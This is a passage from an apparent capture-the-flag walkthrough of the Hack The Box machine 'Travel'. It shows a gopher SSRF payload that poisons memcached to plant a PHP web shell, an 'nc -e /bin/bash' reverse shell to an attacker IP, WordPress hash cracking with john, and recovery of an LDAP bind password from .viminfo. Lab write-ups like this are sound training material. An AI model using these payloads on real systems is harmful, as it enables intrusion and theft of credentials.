</span></span><span class=line><span class=cl>\    \<span class=n>_</span>\  <span class=p>(</span>  <span class=o>&lt;</span><span class=n>_</span><span class=o>&gt;</span> <span class=p>)</span>  <span class=o>|</span><span class=n>_</span><span class=o>&gt;</span> <span class=o>&gt;</span>   <span class=n>Y</span>  \  <span class=n>___</span><span class=o>/|</span>  <span class=o>|</span> \<span class=o>/</span>  <span class=o>|</span>  <span class=o>/</span>\<span class=n>___</span> \
</span></span><span class=line><span class=cl> \<span class=n>______</span>  <span class=o>/</span>\<span class=n>____</span><span class=o>/|</span>   <span class=n>__</span><span class=o>/|</span><span class=n>___</span><span class=o>|</span>  <span class=o>/</span>\<span class=n>___</span>  <span class=o>&gt;</span><span class=n>__</span><span class=o>|</span>  <span class=o>|</span><span class=n>____</span><span class=o>//</span><span class=n>____</span>  <span class=o>&gt;</span>
</span></span><span class=line><span class=cl>        \<span class=o>/</span>       <span class=o>|</span><span class=n>__</span><span class=o>|</span>        \<span class=o>/</span>     \<span class=o>/</span>                 \<span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>author</span><span class=p>:</span> <span class=o>$</span><span class=n>_SpyD3r_</span><span class=o>$</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>This</span> <span class=n>is</span> <span class=n>usable</span> <span class=n>when</span> <span class=n>you</span> <span class=n>know</span> <span class=n>Class</span> <span class=ow>and</span> <span class=n>Variable</span> <span class=n>name</span> <span class=n>used</span> <span class=n>by</span> <span class=n>user</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Give</span> <span class=n>serialization</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl><span class=n>example</span><span class=p>:</span> <span class=n>O</span><span class=p>:</span><span class=mi>5</span><span class=p>:</span><span class=s2>&#34;Hello&#34;</span><span class=p>:</span><span class=mi>0</span><span class=p>:{}</span>   <span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>Your</span> <span class=n>gopher</span> <span class=n>link</span> <span class=n>is</span> <span class=n>ready</span> <span class=n>to</span> <span class=k>do</span> <span class=n>SSRF</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gopher</span><span class=p>:</span><span class=o>//</span><span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span><span class=p>:</span><span class=mi>11211</span><span class=o>/</span><span class=n>_</span><span class=o>%</span><span class=mi>0</span><span class=n>d</span><span class=o>%</span><span class=mi>0</span><span class=n>aset</span><span class=o>%</span><span class=mi>20</span><span class=n>SpyD3r</span><span class=o>%</span><span class=mi>204</span><span class=o>%</span><span class=mi>200</span><span class=o>%</span><span class=mi>20132</span><span class=o>%</span><span class=mi>0</span><span class=n>d</span><span class=o>%</span><span class=mi>0</span><span class=n>aO</span><span class=p>:</span><span class=mi>14</span><span class=p>:</span><span class=o>%</span><span class=mi>22</span><span class=n>TemplateHelper</span><span class=o>%</span><span class=mi>22</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=o>%</span><span class=mi>7</span><span class=n>Bs</span><span class=p>:</span><span class=mi>20</span><span class=p>:</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>00</span><span class=n>TemplateHelper</span><span class=o>%</span><span class=mi>00</span><span class=n>file</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=p>:</span><span class=mi>9</span><span class=p>:</span><span class=o>%</span><span class=mi>22</span><span class=n>cyfun</span><span class=o>.</span><span class=n>php</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=p>:</span><span class=mi>20</span><span class=p>:</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>00</span><span class=n>TemplateHelper</span><span class=o>%</span><span class=mi>00</span><span class=n>data</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=p>:</span><span class=mi>26</span><span class=p>:</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>C</span><span class=o>%</span><span class=mi>3</span><span class=n>Fphp</span><span class=o>%</span><span class=mi>20</span><span class=n>system</span><span class=o>%</span><span class=mi>28</span><span class=o>%</span><span class=mi>24</span><span class=n>_GET</span><span class=o>%</span><span class=mi>5</span><span class=n>B1</span><span class=o>%</span><span class=mi>5</span><span class=n>D</span><span class=o>%</span><span class=mi>29</span><span class=o>%</span><span class=mi>3</span><span class=n>B</span><span class=o>%</span><span class=mi>20</span><span class=o>%</span><span class=mi>3</span><span class=n>F</span><span class=o>%</span><span class=mi>3</span><span class=n>E</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>B</span><span class=o>%</span><span class=mi>7</span><span class=n>D</span><span class=o>%</span><span class=mi>0</span><span class=n>d</span><span class=o>%</span><span class=mi>0</span><span class=n>a</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>After</span> <span class=n>everything</span> <span class=n>done</span><span class=p>,</span> <span class=n>you</span> <span class=n>can</span> <span class=n>delete</span> <span class=n>memcached</span> <span class=n>item</span> <span class=n>by</span> <span class=n>using</span> <span class=n>this</span> <span class=n>payload</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gopher</span><span class=p>:</span><span class=o>//</span><span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span><span class=p>:</span><span class=mi>11211</span><span class=o>/</span><span class=n>_</span><span class=o>%</span><span class=mi>0</span><span class=n>d</span><span class=o>%</span><span class=mi>0</span><span class=n>adelete</span><span class=o>%</span><span class=mi>20</span><span class=n>SpyD3r</span><span class=o>%</span><span class=mi>0</span><span class=n>d</span><span class=o>%</span><span class=mi>0</span><span class=n>a</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>-----------</span><span class=n>Made</span><span class=o>-</span><span class=n>by</span><span class=o>-</span><span class=n>SpyD3r</span><span class=o>-----------</span>
</span></span></code></pre></td></tr></table></div></div><p>Then we just have to run the two steps.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ curl &#39;http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://LOCALHOST:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20132%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:20:%22%00TemplateHelper%00file%22%3Bs:9:%22cyfun.php%22%3Bs:20:%22%00TemplateHelper%00data%22%3Bs:26:%22%3C%3Fphp%20system%28%24_GET%5B1%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ curl http://blog.travel.htb/awesome-rss/
</span></span></code></pre></td></tr></table></div></div><p>And <a href=http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php>http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php</a> is
available.</p><p>Then we have 60 seconds to do something like getting a reverse shell, eg.</p><p><a href="http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php?1=nc%20-e%20/bin/bash%2010.10.14.66%209999">http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php?1=nc%20-e%20/bin/bash%2010.10.14.66%209999</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ pwncat -l 9999 -vv
</span></span><span class=line><span class=cl>INFO: Listening on :::9999 (family 10/IPv6, TCP)
</span></span><span class=line><span class=cl>INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)
</span></span><span class=line><span class=cl>INFO: Client connected from 10.10.10.189:47498 (family 2/IPv4, TCP)
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--from-www-data-to-lynik-admin>Privilege Escalation of Machine : from www-data to lynik-admin<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-www-data-to-lynik-admin>#</a></h2><p>There is a SQL backup in the wordpress directory.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ls -lhA /opt/wordpress
</span></span><span class=line><span class=cl>total 1.2M
</span></span><span class=line><span class=cl>-rw-r--r-- 1 root root 1.2M Apr 24 06:39 backup-13-04-2020.sql
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s look for the user creation:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=err>$</span><span class=w> </span><span class=n>cat</span><span class=w> </span><span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>wordpress</span><span class=o>/</span><span class=n>backup</span><span class=o>-</span><span class=mi>13</span><span class=o>-</span><span class=mi>04</span><span class=o>-</span><span class=mi>2020</span><span class=p>.</span><span class=k>sql</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>grep</span><span class=w> </span><span class=s1>&#39;INSERT INTO `wp_users`&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>INSERT</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=o>`</span><span class=n>wp_users</span><span class=o>`</span><span class=w> </span><span class=k>VALUES</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=s1>&#39;admin&#39;</span><span class=p>,</span><span class=s1>&#39;$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/&#39;</span><span class=p>,</span><span class=s1>&#39;admin&#39;</span><span class=p>,</span><span class=s1>&#39;admin@travel.htb&#39;</span><span class=p>,</span><span class=s1>&#39;http://localhost&#39;</span><span class=p>,</span><span class=s1>&#39;2020-04-13 13:19:01&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=s1>&#39;admin&#39;</span><span class=p>),(</span><span class=mi>2</span><span class=p>,</span><span class=s1>&#39;lynik-admin&#39;</span><span class=p>,</span><span class=s1>&#39;$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.&#39;</span><span class=p>,</span><span class=s1>&#39;lynik-admin&#39;</span><span class=p>,</span><span class=s1>&#39;lynik@travel.htb&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=s1>&#39;2020-04-13 13:36:18&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=s1>&#39;Lynik Schmidt&#39;</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Then we can run to find the hash type:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ haiti &#39;$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.&#39;
</span></span><span class=line><span class=cl>Wordpress ΓëÑ v2.6.2 [HC: 400] [JtR: phpass]
</span></span><span class=line><span class=cl>Joomla ΓëÑ v2.5.18 [HC: 400] [JtR: phpass]
</span></span><span class=line><span class=cl>PHPass&#39; Portable Hash [HC: 400] [JtR: phpass]
</span></span></code></pre></td></tr></table></div></div><p>Then let&rsquo;s start cracking with [john][jtr]:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>john</span> <span class=o>--</span><span class=n>format</span><span class=o>=</span><span class=n>phpass</span> <span class=n>hashes</span><span class=o>.</span><span class=n>txt</span> <span class=o>-</span><span class=n>w</span><span class=o>=/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>wordlists</span><span class=o>/</span><span class=n>passwords</span><span class=o>/</span><span class=n>rockyou</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=n>Using</span> <span class=n>default</span> <span class=n>input</span> <span class=n>encoding</span><span class=p>:</span> <span class=n>UTF</span><span class=o>-</span><span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>Loaded</span> <span class=mi>2</span> <span class=n>password</span> <span class=n>hashes</span> <span class=n>with</span> <span class=mi>2</span> <span class=n>different</span> <span class=n>salts</span> <span class=p>(</span><span class=n>phpass</span> <span class=p>[</span><span class=n>phpass</span> <span class=p>(</span><span class=o>$</span><span class=n>P</span><span class=o>$</span> <span class=ow>or</span> <span class=o>$</span><span class=n>H</span><span class=o>$</span><span class=p>)</span> <span class=mi>128</span><span class=o>/</span><span class=mi>128</span> <span class=n>AVX</span> <span class=mi>4</span><span class=n>x3</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>Cost</span> <span class=mi>1</span> <span class=p>(</span><span class=n>iteration</span> <span class=n>count</span><span class=p>)</span> <span class=n>is</span> <span class=mi>8192</span> <span class=k>for</span> <span class=n>all</span> <span class=n>loaded</span> <span class=n>hashes</span>
</span></span><span class=line><span class=cl><span class=n>Will</span> <span class=n>run</span> <span class=mi>4</span> <span class=n>OpenMP</span> <span class=n>threads</span>
</span></span><span class=line><span class=cl><span class=n>Press</span> <span class=s1>&#39;q&#39;</span> <span class=ow>or</span> <span class=n>Ctrl</span><span class=o>-</span><span class=n>C</span> <span class=n>to</span> <span class=n>abort</span><span class=p>,</span> <span class=n>almost</span> <span class=n>any</span> <span class=n>other</span> <span class=n>key</span> <span class=k>for</span> <span class=n>status</span>
</span></span><span class=line><span class=cl><span class=mi>1</span><span class=n>stepcloser</span>      <span class=p>(</span><span class=err>?</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><code>lynik-admin</code> / <code>1stepcloser</code></p><p>The we can log in via ssh:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ssh lynik-admin@travel.htb
</span></span><span class=line><span class=cl>lynik-admin@travel:~$ id
</span></span><span class=line><span class=cl>uid=1001(lynik-admin) gid=1001(lynik-admin) groups=1001(lynik-admin)
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--from-lynik-admin-to-root>Privilege Escalation of Machine : from lynik-admin to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-lynik-admin-to-root>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>lynik-admin@travel:~$ ls -lhA
</span></span><span class=line><span class=cl>total 32K
</span></span><span class=line><span class=cl>lrwxrwxrwx 1 lynik-admin lynik-admin    9 Apr 23 17:31 .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r-- 1 lynik-admin lynik-admin  220 Feb 25  2020 .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- 1 lynik-admin lynik-admin 3.7K Feb 25  2020 .bashrc
</span></span><span class=line><span class=cl>drwx------ 2 lynik-admin lynik-admin 4.0K Apr 23 19:34 .cache
</span></span><span class=line><span class=cl>drwx------ 4 lynik-admin lynik-admin 4.0K Sep  9 05:48 .gnupg
</span></span><span class=line><span class=cl>-rw-r--r-- 1 lynik-admin lynik-admin   82 Apr 23 19:35 .ldaprc
</span></span><span class=line><span class=cl>-rw-r--r-- 1 lynik-admin lynik-admin  807 Feb 25  2020 .profile
</span></span><span class=line><span class=cl>-r--r--r-- 1 root        root          33 Sep  9 04:56 user.txt
</span></span><span class=line><span class=cl>-rw------- 1 lynik-admin lynik-admin  861 Apr 23 19:35 .viminfo
</span></span></code></pre></td></tr></table></div></div><p>We can see a <code>.viminfo</code> file and a <code>.ldaprc</code> file.</p><p>Some lines in <code>.viminfo</code> are interesting:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Registers:
</span></span><span class=line><span class=cl>&#34;&#34;1     LINE    0
</span></span><span class=line><span class=cl>        BINDPW Theroadlesstraveled
</span></span><span class=line><span class=cl>|3,1,1,1,1,0,1587670528,&#34;BINDPW Theroadlesstraveled&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># File marks:
</span></span><span class=line><span class=cl>&#39;0  3  0  ~/.ldaprc
</span></span><span class=line><span class=cl>|4,48,3,0,1587670530,&#34;~/.ldaprc&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># Jumplist (newest first):
</span></span><span class=line><span class=cl>-&#39;  3  0  ~/.ldaprc
</span></span><span class=line><span class=cl>|4,39,3,0,1587670530,&#34;~/.ldaprc&#34;
</span></span><span class=line><span class=cl>-&#39;  1  0  ~/.ldaprc
</span></span><span class=line><span class=cl>|4,39,1,0,1587670527,&#34;~/.ldaprc&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># History of marks within files (newest to oldest):
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt; ~/.ldaprc
</span></span><span class=line><span class=cl>        *       1587670529      0
</span></span><span class=line><span class=cl>        &#34;       3       0
</span></span><span class=line><span class=cl>        .       4       0
</span></span><span class=line><span class=cl>        +       4       0
</span></span></code></pre></td></tr></table></div></div><p>In the <code>.ldaprc</code> too:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HOST ldap.travel.htb
</span></span><span class=line><span class=cl>BASE dc=travel,dc=htb
</span></span><span class=line><span class=cl>BINDDN cn=lynik-admin,dc=travel,dc=htb
</span></span></code></pre></td></tr></table></div></div><p>With the password and information we can make a request binding to the rootDN:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ldapsearch -H ldap://ldap.travel.htb -x -D &#39;cn=lynik-admin,dc=travel,dc=htb&#39; -w Theroadlesstraveled
</span></span><span class=line><span class=cl># extended LDIF
</span></span><span class=line><span class=cl>#
</span></span><span class=line><span class=cl># LDAPv3
</span></span><span class=line><span class=cl># base &lt;dc=travel,dc=htb&gt; (default) with scope subtree
</span></span><span class=line><span class=cl># filter: (objectclass=*)
</span></span><span class=line><span class=cl># requesting: ALL
</span></span><span class=line><span class=cl>#
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># travel.htb
</span></span><span class=line><span class=cl>dn: dc=travel,dc=htb
</span></span><span class=line><span class=cl>objectClass: top
</span></span><span class=line><span class=cl>objectClass: dcObject
</span></span><span class=line><span class=cl>objectClass: organization
</span></span><span class=line><span class=cl>o: Travel.HTB
</span></span><span class=line><span class=cl>dc: travel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># admin, travel.htb
</span></span><span class=line><span class=cl>dn: cn=admin,dc=travel,dc=htb
</span></span><span class=line><span class=cl>objectClass: simpleSecurityObject
</span></span><span class=line><span class=cl>objectClass: organizationalRole
</span></span><span class=line><span class=cl>cn: admin
</span></span><span class=line><span class=cl>description: LDAP administrator
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># servers, travel.htb
</span></span><span class=line><span class=cl>dn: ou=servers,dc=travel,dc=htb
</span></span><span class=line><span class=cl>description: Servers
</span></span><span class=line><span class=cl>objectClass: organizationalUnit
</span></span><span class=line><span class=cl>ou: servers
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># lynik-admin, travel.htb
</span></span><span class=line><span class=cl>dn: cn=lynik-admin,dc=travel,dc=htb
</span></span><span class=line><span class=cl>description: LDAP administrator
</span></span><span class=line><span class=cl>objectClass: simpleSecurityObject
</span></span><span class=line><span class=cl>objectClass: organizationalRole
</span></span><span class=line><span class=cl>cn: lynik-admin
</span></span><span class=line><span class=cl>userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ=
</span></span><span class=line><span class=cl> =
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># workstations, travel.htb
</span></span><span class=line><span class=cl>dn: ou=workstations,dc=travel,dc=htb
</span></span><span class=line><span class=cl>description: Workstations
